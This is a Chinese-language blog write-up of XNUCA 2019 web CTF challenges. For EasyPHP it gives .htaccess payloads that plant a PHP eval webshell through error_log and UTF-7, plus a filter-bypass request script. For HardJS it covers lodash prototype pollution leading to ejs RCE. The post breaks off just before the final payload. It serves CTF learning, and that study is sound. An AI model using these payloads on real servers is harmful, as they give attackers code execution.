<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lethe">


    <meta name="subtitle" content="Life is a struggle">


    <meta name="description" content="Lethe's Blog">


    <meta name="keywords" content="Lethe's Blog">


<title>ByteCTF_2019&amp;XNUCA_2019部分web题复现 | Lethe&#39;s Blog</title>



    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/blog/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/blog/js/script.js"></script>
    
    <script src="/blog/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.1.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/blog/">Lethe&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/blog/archives">Posts</a>
                
                    <a class="menu-item" href="/blog/category">Categories</a>
                
                    <a class="menu-item" href="/blog/tag">Tags</a>
                
                    <a class="menu-item" href="/blog/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/blog/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/blog/archives">Posts</a>
                
                    <a class="menu-item" href="/blog/category">Categories</a>
                
                    <a class="menu-item" href="/blog/tag">Tags</a>
                
                    <a class="menu-item" href="/blog/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">ByteCTF_2019&amp;XNUCA_2019部分web题复现</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">September 11, 2019&nbsp;&nbsp;13:06:12</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/blog/categories/Writeup/">Writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="XNUCA-2019-EasyPHP"><a href="#XNUCA-2019-EasyPHP" class="headerlink" title="XNUCA 2019 EasyPHP"></a>XNUCA 2019 EasyPHP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nJust one chance&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>1、题目给出了源码如上，大概意思就是：</p>
<ul>
<li><p>前后都有遍历删除目录下<code>index.php</code>以外的文件的代码</p>
</li>
<li><p>会包含文件<code>fl3g.php</code></p>
</li>
<li><p>接受<code>content</code>和<code>filename</code>两个参数，<code>content</code>过滤了一些关键词，<code>filename</code>只允许为<code>[a-z.]* </code></p>
</li>
<li><p>最后写入文件，文件名为<code>filename</code>，内容为<code>content</code>+<code>\nJust one chance</code></p>
</li>
</ul>
<p>2、发现可以写入php文件但是没有办法解析，于是尝试上传<code>.htaccess</code>文件来设置解析php文件，但是会报500，因为文件结尾被添加了一行无法解析<code>Just one chance</code>内容，我们知道在<code>.htaccess</code>中只有<code>#</code>单行注释符，并没有多行注释符，但是它像大多数语言一样支持用<code>\</code>拼接上下两行，所以可以利用<code># \</code>将最后一行的内容注释掉。</p>
<p>解决了最后最后一行的问题，但是由于对于<code>content</code>内容的限制，同样没有办法直接设置解析php文件。</p>
<p>3、观察到文件中有<code>include_once(&quot;fl3g.php&quot;);</code>一句，但是实际上<code>fl3g.php</code>文件已经被删除了，所以肯定有蹊跷… 翻阅php.ini的参数可以看到这个：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190914203024986.png" alt="在这里插入图片描述"><br>这个参数可以指定一个目录列表，其中require、include、fopen()、file()、readfile()和file_get_contents()函数在查找要包含的文件时，会分别考虑include路径中的每个条目。它将检查第一个路径，如果没有找到，则检查下一个路径，直到找到包含的文件或返回警告或错误。</p>
<p>所以想办法在其他目录下写入同名<code>fl3g.php</code>文件，并且里面包含我们的shell，然后通过设置此参数，然该文件可以成功包含<code>fl3g.php</code>从而getshell。</p>
<p>4、下面就是如何在其他目录下写入文件，且文件名和内容可控，<code>filename</code>参数过滤了<code>/</code>，所以没办法直接通过<code>file_put_contents</code>函数。</p>
<p>php的配置选项中有<code>error_log</code>可以满足这一点，<code>error_log</code>可以将php运行报错的记录写到指定文件中。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190914204129467.png" alt="在这里插入图片描述"><br>正好在文件中会包含一个不存在<code>fl3g.php</code>从而产生报错，所以我们可以把上面说的<code>include_path</code>设置为payload，这样就可以在我们指定的目录下生成文件了。</p>
<p>5、还有一点需要注意，这里写进error_log的内容会被html编码，这里可以使用utf7编码进行绕过。</p>
<p>在线编码网站：<a target="_blank" rel="noopener" href="http://toolswebtop.com/text/process/encode/utf-7">http://toolswebtop.com/text/process/encode/utf-7</a></p>
<p>6、步骤</p>
<p>（1）向<code>.htaccess</code>文件中写入如下payload，通过<code>error_log</code>配合<code>include_path</code>在tmp目录生成shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>

<p>（2）访问index.php文件后，再将include_path写为<code>/tmp</code>并通过utf7编码执行shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;/tmp&quot;</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>


<h4 id="非预期解一"><a href="#非预期解一" class="headerlink" title="非预期解一"></a>非预期解一</h4><p>通过用<code>\</code>拼接上下两行来绕过过滤，从而写入被限制的内容，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure>

<p>参考<a target="_blank" rel="noopener" href="http://iv4n.xyz/2019-wp/#2019xnuca">Iv4n</a>的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://64252b1b-326b-43dd-8dcf-e8afa7dff495.node1.buuoj.cn/&#x27;</span></span><br><span class="line">r = requests.get(url+<span class="string">&#x27;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20&quot;.htaccess&quot;%0AErrorDocument%20404%20&quot;&lt;?php%20system(\&#x27;cat%20../../../fl[a]g\&#x27;);?&gt;\\&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190914221142759.png" alt="在这里插入图片描述"></p>
<h4 id="非预期解二"><a href="#非预期解二" class="headerlink" title="非预期解二"></a>非预期解二</h4><p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) </code>，而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0) </code>，因此存在了被绕过的可能。 通过设置<code>.htaccess</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>
<p>导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。</p>
<br>

<h1 id="XNUCA-2019-HardJS"><a href="#XNUCA-2019-HardJS" class="headerlink" title="XNUCA 2019 HardJS"></a>XNUCA 2019 HardJS</h1><p>1、题目直接给了源码，进行代码审计，是一个node.js的后端，再根据题目名字，判断应该是一道原型链污染的题目，对<code>server.js</code>进行审计。</p>
<ul>
<li><code>/</code> 首页</li>
<li><code>/static</code> 静态文件</li>
<li><code>/sandbox</code> 显示用户HTML数据用的沙盒</li>
<li><code>/login</code> 登陆</li>
<li><code>/register</code> 注册</li>
<li><code>/get</code> json接口 获取数据库中保存的数据</li>
<li><code>/add</code> 用户添加数据的接口</li>
</ul>
<p>注意到下面这段代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Merge the recorder in the database.&quot;</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `id`,`dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.<span class="property">length</span> ;i++)&#123;</span><br><span class="line">            lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">&quot;delete from `html` where id = ?&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,raws[i].<span class="property">id</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		···</span><br></pre></td></tr></table></figure>

<p>原型链污染的题目，对merge应该比较敏感…可以看到这里当从数据库中查找出来的数据大于5条时，将进行合并，使用的是</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br></pre></td></tr></table></figure>
<p>这里正好涉及到了一个lodash库的原型链污染漏洞，即<code>CVE-2019-10744</code>，而题目中的lodash版本也正好是未修复的版本。</p>
<p>可参考：<a target="_blank" rel="noopener" href="https://www.venustech.com.cn/article/1/9577.html">https://www.venustech.com.cn/article/1/9577.html</a></p>
<p>原POC是如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).<span class="property">defaultsDeep</span>;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;a0&quot;: true&#125;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">mergeFn</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>();</span><br></pre></td></tr></table></figure>

<p>我们在题目的环境下简单测试一下：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/2019091515505735.png" alt="在这里插入图片描述"></p>
<p>发现原型链污染可以成功，下面就是寻找可利用的点来进行RCE。</p>
<p>此题使用使用ejs库作为模版引擎了，看一下<code>ejs.js</code>，发现从572行开始进行了大量的js代码拼接，关键部分如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">source</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">generateSource</span>();</span><br><span class="line">  prepended += <span class="string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">    prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">    prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  appended += <span class="string">&#x27;  return __output.join(&quot;&quot;);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">source</span> = prepended + <span class="variable language_">this</span>.<span class="property">source</span> + appended;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">  src = <span class="string">&#x27;var __line = 1&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;  , __lines = &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">templateText</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;  , __filename = &#x27;</span> + (opts.<span class="property">filename</span> ?</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(opts.<span class="property">filename</span>) : <span class="string">&#x27;undefined&#x27;</span>) + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;try &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="variable language_">this</span>.<span class="property">source</span></span><br><span class="line">    + <span class="string">&#x27;&#125; catch (e) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;  rethrow(e, __lines, __filename, __line, escapeFn);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;&#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  src = <span class="variable language_">this</span>.<span class="property">source</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到当<code>opts</code>存在属性<code>outputFunctionName</code>时，便会被直接拼接到<code>prepended</code>这段js代码中，然后再拼接到<code> this.source</code>，最后再拼接到<code>src</code>中。</p>
<p>我们跟进一下这段代码最后执行的地方：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (opts.<span class="property">async</span>) &#123;</span><br><span class="line">        <span class="comment">// Have to use generated function for this, since in envs without support,</span></span><br><span class="line">        <span class="comment">// it breaks in parsing</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          ctor = (<span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;return (async function()&#123;&#125;).constructor;&#x27;</span>))();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="title class_">SyntaxError</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;This environment does not support async/await&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        ctor = <span class="title class_">Function</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fn = <span class="keyword">new</span> <span class="title function_">ctor</span>(opts.<span class="property">localsName</span> + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">	···</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> (opts.<span class="property">client</span>) &#123;</span><br><span class="line">      fn.<span class="property">dependencies</span> = <span class="variable language_">this</span>.<span class="property">dependencies</span>;</span><br><span class="line">      <span class="keyword">return</span> fn;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后生成了一个动态的函数，然后以<code>returned fn</code>返回并被执行。</p>
<p>所以我们的思路就是覆盖<code>opts.outputFunctionName</code>，这样我们构造的payload就会被拼接进js语句中，并在ejs渲染时进行RCE。</p>
<p>关于payload的构造，可参考这篇文章：<a target="_blank" rel="noopener" href="http://f1sh.site/2019/04/17/node-js-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-cve-2017-16082-%E5%88%86%E6%9E%90/">node-js-学习笔记</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190915162710452.png" alt="在这里插入图片描述"><br>最终payload如下：</p>
